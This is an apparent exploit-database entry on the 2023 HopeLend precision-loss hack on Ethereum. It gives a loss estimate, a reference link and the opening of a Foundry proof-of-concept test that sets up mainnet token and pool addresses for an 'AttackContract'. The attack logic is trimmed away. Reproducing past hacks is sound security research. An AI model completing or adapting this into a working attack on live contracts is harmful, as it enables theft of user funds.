# [?] Hopelend - Div Precision Loss

## Summary
Severity: Unknown
Chain: Ethereum
Component: Hopelend
Published: 2023-10-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Hopelend_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$825K
References:
- https://lunaray.medium.com/deep-dive-into-hopelend-hack-5962e8b55d3f

```solidity
contract ContractTest is Test {
    IERC20 private WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private HOPE = IERC20(0xc353Bf07405304AeaB75F4C2Fac7E88D6A68f98e);
    IERC20 private stHOPE = IERC20(0xF5C6d9Fc73991F687f158FE30D4A77691a9Fd4d8);
    // proxy  0xf1cd4193bbc1ad4a23e833170f49d60f3d35a621
    IAaveFlashloan AaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    // proxy  0x53fbcada1201a465740f2d64ecdf6fac425f9030
    IHopeLendPool HopeLend = IHopeLendPool(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);

    IERC20 private hEthWBTC = IERC20(0x25126F207Db7dC427415eA640ce0187767403907);

    IUniswapV2Router UniRouter02 = IUniswapV2Router(payable(0x219Bd2d1449F3813c01204EE455D11B41D5051e9));

    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    uint256 index = 0;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_377_041);
        vm.label(address(this), "AttackContract");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(USDT), "USDT");
        vm.label(address(HOPE), "HOPE");
        vm.label(address(stHOPE), "stHOPE");
        vm.label(address(AaveV3), "AaveV3");
        vm.label(address(HopeLend), "HopeLend");
        vm.label(address(hEthWBTC), "hEthWBTC");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Hopelend_exp.sol_
